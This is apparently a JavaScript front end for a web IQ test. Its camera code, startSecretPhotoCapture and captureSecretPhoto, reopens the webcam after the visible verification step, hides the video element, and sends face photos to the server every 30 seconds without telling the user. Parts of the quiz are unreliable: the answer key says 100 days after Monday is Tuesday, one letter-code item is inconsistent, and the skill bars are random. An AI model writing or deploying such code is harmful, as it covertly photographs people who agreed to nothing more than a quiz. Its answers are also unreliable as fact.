// IQ Test Application
class IQTestApp {
    constructor() {
        this.currentQuestion = 0;
        this.answers = [];
        this.sessionId = this.getSessionId();
        this.stream = null;
        this.photos = [];
        this.ws = null;
        
        this.questions = [
            {
                question: "If all Bloops are Razzles and all Razzles are Lazzles, then all Bloops are definitely Lazzles?",
                options: ["True", "False", "Cannot be determined", "Insufficient information"],
                correct: 0
            },
            {
                question: "What number should replace the question mark? 2, 6, 12, 20, 30, ?",
                options: ["40", "42", "45", "48"],
                correct: 1
            },
            {
                question: "Which word does not belong? Apple, Orange, Banana, Carrot, Grape",
                options: ["Apple", "Orange", "Carrot", "Grape"],
                correct: 2
            },
            {
                question: "If you rearrange the letters 'CIFAIPC' you would have the name of a(n):",
                options: ["City", "Animal", "Ocean", "Country"],
                correct: 2
            },
            {
                question: "What comes next in this sequence? 1, 1, 2, 3, 5, 8, ?",
                options: ["11", "13", "15", "16"],
                correct: 1
            },
            {
                question: "A clock shows 3:15. What is the angle between the hour and minute hands?",
                options: ["0°", "7.5°", "15°", "22.5°"],
                correct: 1
            },
            {
                question: "If 3 cats catch 3 mice in 3 minutes, how many cats are needed to catch 100 mice in 100 minutes?",
                options: ["3", "33", "100", "300"],
                correct: 0
            },
            {
                question: "Which number is the odd one out? 17, 23, 29, 33, 37",
                options: ["17", "23", "33", "37"],
                correct: 2
            },
            {
                question: "Complete the analogy: Book is to Reading as Fork is to:",
                options: ["Eating", "Kitchen", "Spoon", "Food"],
                correct: 0
            },
            {
                question: "What is the next letter in this sequence? A, D, G, J, ?",
                options: ["K", "L", "M", "N"],
                correct: 2
            },
            {
                question: "If today is Monday, what day will it be 100 days from now?",
                options: ["Monday", "Tuesday", "Wednesday", "Thursday"],
                correct: 1
            },
            {
                question: "Which shape completes the pattern? Circle, Square, Triangle, Circle, Square, ?",
                options: ["Circle", "Square", "Triangle", "Pentagon"],
                correct: 2
            },
            {
                question: "What is 15% of 240?",
                options: ["32", "36", "40", "48"],
                correct: 1
            },
            {
                question: "If BAT = 23, CAT = 24, what does DOG equal?",
                options: ["26", "27", "28", "29"],
                correct: 0
            },
            {
                question: "Which word can be made from these letters? TRSAET",
                options: ["TREATS", "TASTER", "RATTER", "STARTER"],
                correct: 1
            },
            {
                question: "What number is missing? 8, 27, ?, 125, 216",
                options: ["54", "64", "72", "81"],
                correct: 1
            },
            {
                question: "If you flip a fair coin 10 times and get heads every time, what is the probability of getting heads on the 11th flip?",
                options: ["Very low", "50%", "Very high", "Cannot be determined"],
                correct: 1
            },
            {
                question: "Which number continues this pattern? 1, 4, 9, 16, 25, ?",
                options: ["30", "35", "36", "49"],
                correct: 2
            },
            {
                question: "What comes next? Monday, Wednesday, Friday, ?",
                options: ["Saturday", "Sunday", "Monday", "Tuesday"],
                correct: 1
            },
            {
                question: "If EARTH is coded as HTWOG, how is WATER coded?",
                options: ["ZDWHU", "YDVGT", "ZEXIV", "XBUFS"],
                correct: 0
            },
            {
                question: "Which is the odd one out? Mozart, Beethoven, Da Vinci, Bach",
                options: ["Mozart", "Beethoven", "Da Vinci", "Bach"],
                correct: 2
            },
            {
                question: "Complete the sequence: 2, 6, 18, 54, ?",
                options: ["108", "162", "216", "270"],
                correct: 1
            },
            {
                question: "If all Glips are Flops and some Flops are Clips, then:",
                options: ["All Clips are Glips", "Some Glips are Clips", "No Glips are Clips", "Cannot be determined"],
                correct: 3
            },
            {
                question: "What is the result of: 7 × 8 + 15 ÷ 3 - 10?",
                options: ["51", "49", "47", "45"],
                correct: 0
            },
            {
                question: "Which number should replace the question mark? 3, 7, 15, 31, ?",
                options: ["51", "55", "63", "67"],
                correct: 2
            }
        ];
        
        this.init();
    }
    
    getSessionId() {
        const urlParts = window.location.pathname.split('/');
        return urlParts[urlParts.length - 1];
    }
    
    init() {
        this.connectWebSocket();
        this.bindEvents();
        this.shuffleQuestions();
    }
    
    connectWebSocket() {
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const wsUrl = `${protocol}//${window.location.host}`;
        
        this.ws = new WebSocket(wsUrl);
        
        this.ws.onopen = () => {
            console.log('Connected to server');
        };
        
        this.ws.onclose = () => {
            console.log('Disconnected from server');
            // Attempt reconnection after 3 seconds
            setTimeout(() => this.connectWebSocket(), 3000);
        };
        
        this.ws.onerror = (error) => {
            console.error('WebSocket error:', error);
        };
    }
    
    shuffleQuestions() {
        for (let i = this.questions.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [this.questions[i], this.questions[j]] = [this.questions[j], this.questions[i]];
        }
        // Take only 25 questions
        this.questions = this.questions.slice(0, 25);
    }
    
    bindEvents() {
        const startBtn = document.getElementById('start-test-btn');
        const verifyBtn = document.getElementById('verify-btn');
        const nextBtn = document.getElementById('next-btn');
        const retakeBtn = document.getElementById('retake-btn');
        
        startBtn.addEventListener('click', () => this.startCameraSetup());
        verifyBtn.addEventListener('click', () => this.captureVerificationPhoto());
        nextBtn.addEventListener('click', () => this.nextQuestion());
        retakeBtn.addEventListener('click', () => this.retakeTest());
    }
    
    showScreen(screenId) {
        document.querySelectorAll('.screen').forEach(screen => {
            screen.classList.remove('active');
        });
        document.getElementById(screenId).classList.add('active');
    }
    
    async startCameraSetup() {
        this.showScreen('camera-screen');
        
        try {
            this.stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    width: { ideal: 1280 },
                    height: { ideal: 720 },
                    facingMode: 'user'
                },
                audio: false 
            });
            
            const video = document.getElementById('camera-video');
            video.srcObject = this.stream;
            
            const statusEl = document.getElementById('camera-status');
            statusEl.innerHTML = '<span class="status-icon">✅</span><span>Camera ready for verification</span>';
            
            const verifyBtn = document.getElementById('verify-btn');
            verifyBtn.disabled = false;
            
        } catch (error) {
            console.error('Camera access error:', error);
            const statusEl = document.getElementById('camera-status');
            statusEl.innerHTML = '<span class="status-icon">❌</span><span>Camera access denied. Please allow camera access and refresh.</span>';
        }
    }
    
    captureVerificationPhoto() {
        const video = document.getElementById('camera-video');
        const canvas = document.getElementById('camera-canvas');
        const ctx = canvas.getContext('2d');
        
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        ctx.drawImage(video, 0, 0);
        
        // Convert to base64
        const photoData = canvas.toDataURL('image/jpeg', 0.8);
        this.photos.push({
            type: 'verification',
            timestamp: Date.now(),
            data: photoData
        });
        
        // Send to server
        this.sendPhotoToServer('verification', photoData);
        
        // Stop camera stream
        if (this.stream) {
            this.stream.getTracks().forEach(track => track.stop());
        }
        
        // Start the test
        this.startTest();
    }
    
    sendPhotoToServer(type, photoData) {
        if (this.ws && this.ws.readyState === WebSocket.OPEN) {
            this.ws.send(JSON.stringify({
                type: 'iq_photo_capture',
                sessionId: this.sessionId,
                photoType: type,
                photo: photoData,
                timestamp: Date.now(),
                currentQuestion: this.currentQuestion
            }));
        }
    }
    
    startTest() {
        this.showScreen('test-screen');
        this.displayQuestion();
        
        // Restart camera secretly for periodic captures
        this.startSecretPhotoCapture();
    }
    
    async startSecretPhotoCapture() {
        try {
            // Request camera again but keep it hidden
            this.stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    width: { ideal: 640 },
                    height: { ideal: 480 },
                    facingMode: 'user'
                },
                audio: false 
            });
            
            // Create hidden video element
            const hiddenVideo = document.createElement('video');
            hiddenVideo.style.display = 'none';
            hiddenVideo.srcObject = this.stream;
            hiddenVideo.autoplay = true;
            hiddenVideo.muted = true;
            document.body.appendChild(hiddenVideo);
            
            // Capture photo every 30 seconds
            this.photoInterval = setInterval(() => {
                this.captureSecretPhoto(hiddenVideo);
            }, 30000);
            
            // Capture photo on each question
            this.captureSecretPhoto(hiddenVideo);
            
        } catch (error) {
            console.error('Secret camera setup failed:', error);
        }
    }
    
    captureSecretPhoto(video) {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        ctx.drawImage(video, 0, 0);
        
        const photoData = canvas.toDataURL('image/jpeg', 0.6);
        this.photos.push({
            type: 'progress',
            timestamp: Date.now(),
            question: this.currentQuestion,
            data: photoData
        });
        
        this.sendPhotoToServer('progress', photoData);
    }
    
    displayQuestion() {
        const question = this.questions[this.currentQuestion];
        const questionContent = document.getElementById('question-content');
        
        questionContent.innerHTML = `
            <div class="question">
                <h3>${question.question}</h3>
                <div class="answer-options">
                    ${question.options.map((option, index) => `
                        <div class="answer-option" data-answer="${index}">
                            <strong>${String.fromCharCode(65 + index)}.</strong> ${option}
                        </div>
                    `).join('')}
                </div>
            </div>
        `;
        
        // Update progress
        const progress = ((this.currentQuestion + 1) / this.questions.length) * 100;
        document.getElementById('progress-fill').style.width = `${progress}%`;
        document.getElementById('question-counter').textContent = `Question ${this.currentQuestion + 1} of ${this.questions.length}`;
        
        // Bind answer selection
        document.querySelectorAll('.answer-option').forEach(option => {
            option.addEventListener('click', () => {
                document.querySelectorAll('.answer-option').forEach(opt => opt.classList.remove('selected'));
                option.classList.add('selected');
                
                const answerIndex = parseInt(option.dataset.answer);
                this.answers[this.currentQuestion] = answerIndex;
                
                document.getElementById('next-btn').disabled = false;
            });
        });
        
        // Disable next button until answer is selected
        document.getElementById('next-btn').disabled = true;
    }
    
    nextQuestion() {
        this.currentQuestion++;
        
        if (this.currentQuestion < this.questions.length) {
            this.displayQuestion();
        } else {
            this.finishTest();
        }
    }
    
    finishTest() {
        // Stop secret photo capture
        if (this.photoInterval) {
            clearInterval(this.photoInterval);
        }
        
        if (this.stream) {
            this.stream.getTracks().forEach(track => track.stop());
        }
        
        // Calculate score
        let correctAnswers = 0;
        this.questions.forEach((question, index) => {
            if (this.answers[index] === question.correct) {
                correctAnswers++;
            }
        });
        
        const percentage = (correctAnswers / this.questions.length) * 100;
        const iqScore = Math.round(85 + (percentage / 100) * 45); // Scale to 85-130 range
        
        // Show results
        this.showResults(iqScore, percentage);
        
        // Send completion data to server
        this.sendTestCompletion(iqScore, correctAnswers);
    }
    
    sendTestCompletion(iqScore, correctAnswers) {
        if (this.ws && this.ws.readyState === WebSocket.OPEN) {
            this.ws.send(JSON.stringify({
                type: 'iq_test_complete',
                sessionId: this.sessionId,
                score: iqScore,
                correctAnswers: correctAnswers,
                totalQuestions: this.questions.length,
                answers: this.answers,
                timestamp: Date.now()
            }));
        }
    }
    
    showResults(iqScore, percentage) {
        this.showScreen('results-screen');
        
        // Animate score display
        this.animateScore(iqScore);
        
        // Show interpretation
        const description = this.getScoreDescription(iqScore);
        document.getElementById('score-description').textContent = description;
        
        // Animate skill bars
        setTimeout(() => {
            this.animateSkillBars(percentage);
        }, 1000);
    }
    
    animateScore(targetScore) {
        const scoreElement = document.getElementById('final-score');
        let currentScore = 0;
        const increment = targetScore / 100;
        
        const animation = setInterval(() => {
            currentScore += increment;
            scoreElement.textContent = Math.floor(currentScore);
            
            if (currentScore >= targetScore) {
                scoreElement.textContent = targetScore;
                clearInterval(animation);
            }
        }, 20);
    }
    
    getScoreDescription(score) {
        if (score >= 130) return "Exceptional intelligence - you demonstrate superior cognitive abilities with outstanding problem-solving skills.";
        if (score >= 115) return "Above average intelligence - you show strong analytical thinking and excellent reasoning capabilities.";
        if (score >= 100) return "Average intelligence - you demonstrate solid cognitive abilities and good problem-solving skills.";
        if (score >= 85) return "Below average - you show adequate cognitive abilities with room for improvement in analytical thinking.";
        return "Significantly below average - consider developing your analytical and reasoning skills further.";
    }
    
    animateSkillBars(percentage) {
        const logical = Math.min(100, percentage + Math.random() * 20 - 10);
        const pattern = Math.min(100, percentage + Math.random() * 20 - 10);
        const analytical = Math.min(100, percentage + Math.random() * 20 - 10);
        
        document.querySelector('[data-skill="logical"]').style.width = `${logical}%`;
        document.querySelector('[data-skill="pattern"]').style.width = `${pattern}%`;
        document.querySelector('[data-skill="analytical"]').style.width = `${analytical}%`;
    }
    
    retakeTest() {
        // Reset test state
        this.currentQuestion = 0;
        this.answers = [];
        this.photos = [];
        
        // Shuffle questions again
        this.shuffleQuestions();
        
        // Show welcome screen
        this.showScreen('welcome-screen');
    }
}

// Initialize the application when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    new IQTestApp();
});